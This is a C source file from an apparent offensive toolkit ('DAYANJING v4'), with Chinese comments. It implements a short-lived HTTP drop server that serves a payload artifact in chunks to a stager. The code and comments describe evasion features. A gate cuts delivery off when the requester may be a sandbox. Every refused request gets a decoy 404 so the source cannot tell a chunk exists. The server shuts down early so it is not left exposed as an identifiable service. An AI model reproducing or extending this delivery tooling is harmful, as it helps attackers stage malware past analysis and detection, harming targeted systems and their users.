/* DAYANJING v4 — 25_deploy / src/drop_serve.c
 *
 * 投递服务端：把制品按块提供给 stager。
 *
 * 与 stager 的分工：服务端持有制品，stager 持有 manifest（含摘要）。
 * 服务端不知道 stager 期望什么，因此即便被劫持也投不出别的制品。
 *
 * 门控是每块一次的机会 —— 可疑来源可以中途断供，而不必等整个制品
 * 送完才发现是在给沙箱送货。内置的是一个计数门控（投满 N 块即停），
 * 真实部署应替换为 IP/UA/频率判断。
 */

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "drop.h"
#include "drop_http.h"

#define SERVE_REQBUF 2048
#define SERVE_RESPBUF (DP_CHUNK_MAX + 1024)

/* 投递点是临时的。两个上界缺一不可：
   - 总时限：门控拒绝后 served 不再增长，循环会永远阻塞在 accept，
             进程永久残留 —— 这与"投递点临时"直接冲突。
   - 连接上限：防来源反复重连把进程拖住，即便未超时也退出。 */
#define SERVE_TIMEOUT_DEFAULT 60u
#define SERVE_MAX_CONN        (DP_MAX_CHUNKS * 4u + 16u)

typedef struct {
    uint8_t  got[DP_MAX_CHUNKS / 8u];
    uint32_t served;        /* 已投出的不同块数 */
    uint32_t deny_after;    /* 投满这些块后拒绝；0 表示不限 */
    uint32_t denied;
    uint32_t badreq;
} serve_ctx_t;

/* 写全。不忽略 write 返回值：短写会让对端收到截断的块，
   表现为"块长度不符"——与本层的 LEN 错误混在一起无法区分。 */
static void send_raw(int fd, const uint8_t *b, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t w = write(fd, b + off, n - off);
        if (w <= 0) return;
        off += (size_t)w;
    }
}

static int gate_count(uint32_t idx, void *ud)
{
    (void)idx;
    serve_ctx_t *c = (serve_ctx_t *)ud;
    if (!c) return 0;
    if (c->deny_after > 0 && c->served >= c->deny_after) {
        c->denied++;
        return 0;
    }
    return 1;
}

static int read_file(const char *path, uint8_t **out, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return -1; }
    rewind(f);
    uint8_t *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return -1; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return -1;
    }
    fclose(f);
    *out = buf; *len = (size_t)sz;
    return 0;
}

/* 读一个请求：读到 "\r\n\r\n" 为止。
   请求体对 GET 无意义，不需要读到连接关闭。 */
static int read_request(int fd, char *buf, size_t cap, size_t *rlen)
{
    size_t off = 0;
    for (;;) {
        if (off >= cap) return -1;
        ssize_t n = read(fd, buf + off, cap - off);
        if (n < 0) return -1;
        if (n == 0) break;
        off += (size_t)n;
        /* SEC-CMP:PUBLIC: 双方均为公开数据（传输中可见或可自行计算），无秘密可泄露 */
        if (off >= 4 && memcmp(buf + off - 4, "\r\n\r\n", 4) == 0) break;
    }
    *rlen = off;
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 5) {
        fprintf(stderr,
                "usage: %s <bind_ip> <port> <artifact.dj> <manifest_out> [deny_after]\n",
                argv[0]);
        return 2;
    }

    const char *bind_ip = argv[1];
    long p = strtol(argv[2], NULL, 10);
    if (p < 0 || p > 65535) { fprintf(stderr, "bad port\n"); return 2; }

    uint8_t *blob = NULL;
    size_t blob_len = 0;
    if (read_file(argv[3], &blob, &blob_len) != 0 || blob_len == 0) {
        fprintf(stderr, "read artifact failed\n");
        return 2;
    }

    uint32_t deny_after = 0;
    if (argc >= 6) {
        long d = strtol(argv[5], NULL, 10);
        if (d > 0) deny_after = (uint32_t)d;
    }

    /* 总时限：到点即终止。用默认 SIGALRM 处置（进程终止），
       不做优雅关闭 —— 投递点本就该在投完后立刻消失。 */
    unsigned timeout_s = SERVE_TIMEOUT_DEFAULT;
    if (argc >= 7) {
        long t = strtol(argv[6], NULL, 10);
        if (t > 0 && t < 3600) timeout_s = (unsigned)t;
    }
    alarm(timeout_s);

    dp_manifest_t m;
    int rc = dp_manifest_build(blob, blob_len, DP_CHUNK_MAX, &m);
    if (rc != DP_OK) {
        fprintf(stderr, "manifest build rc=%d\n", rc);
        free(blob); return 2;
    }

    /* 写出 manifest：stager 需要它，建造者也需要它做摘要基准。 */
    FILE *mf = fopen(argv[4], "wb");
    if (!mf) { fprintf(stderr, "open manifest out failed\n"); free(blob); return 2; }
    if (fwrite(&m, 1, sizeof(m), mf) != sizeof(m)) {
        fclose(mf); free(blob); return 2;
    }
    fclose(mf);

    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) { free(blob); return 2; }
    int on = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)p);
    if (inet_pton(AF_INET, bind_ip, &sa.sin_addr) != 1) {
        fprintf(stderr, "bad bind ip\n"); free(blob); close(lfd); return 2;
    }
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "bind failed\n"); free(blob); close(lfd); return 2;
    }
    if (listen(lfd, 8) < 0) {
        fprintf(stderr, "listen failed\n"); free(blob); close(lfd); return 2;
    }

    /* port=0 时取内核分配的端口，写给调用方（测试与编排脚本都要读）。 */
    struct sockaddr_in actual;
    socklen_t alen = sizeof(actual);
    if (getsockname(lfd, (struct sockaddr *)&actual, &alen) == 0) {
        fprintf(stderr, "PORT %u\n", (unsigned)ntohs(actual.sin_port));
        fflush(stderr);
    }

    serve_ctx_t ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.deny_after = deny_after;

    char *req = malloc(SERVE_REQBUF);
    uint8_t *resp = malloc(SERVE_RESPBUF);
    if (!req || !resp) { free(req); free(resp); free(blob); close(lfd); return 2; }

    /* 投满所有块即退出。不无限监听：投递点是临时的，
       长期监听等于长期暴露一个可识别的服务。 */
    uint32_t conns = 0;
    while (ctx.served < m.nchunks && conns < SERVE_MAX_CONN) {
        int cfd = accept(lfd, NULL, NULL);
        if (cfd < 0) break;
        conns++;

        size_t rlen = 0;
        if (read_request(cfd, req, SERVE_REQBUF, &rlen) != 0) {
            close(cfd); continue;
        }

        uint32_t idx = 0;
        if (dp_http_parse_request(req, rlen, &idx) != DP_OK) {
            ctx.badreq++;
            size_t olen = 0;
            if (dp_http_build_decoy(resp, SERVE_RESPBUF, &olen) == DP_OK)
                send_raw(cfd, resp, olen);
            close(cfd);
            continue;
        }

        const uint8_t *chunk = NULL;
        size_t clen = 0;
        rc = dp_serve_chunk(blob, blob_len, &m, idx, gate_count, &ctx,
                            &chunk, &clen);
        size_t olen = 0;
        if (rc == DP_OK) {
            if (dp_http_build_response(chunk, clen, NULL,
                                       resp, SERVE_RESPBUF, &olen) == DP_OK)
                send_raw(cfd, resp, olen);
            uint32_t byte = idx / 8u, bit = idx % 8u;
            if ((ctx.got[byte] & (uint8_t)(1u << bit)) == 0) {
                ctx.got[byte] |= (uint8_t)(1u << bit);
                ctx.served++;
            }
        } else {
            /* 越界、门控拒绝一律回 404。
               区分错误码等于告诉来源"块号存在但你没权限"。 */
            if (dp_http_build_decoy(resp, SERVE_RESPBUF, &olen) == DP_OK)
                send_raw(cfd, resp, olen);
        }
        close(cfd);
    }

    fprintf(stderr, "served=%u denied=%u badreq=%u nchunks=%u\n",
            ctx.served, ctx.denied, ctx.badreq, m.nchunks);

    free(req); free(resp); free(blob); close(lfd);
    return 0;
}
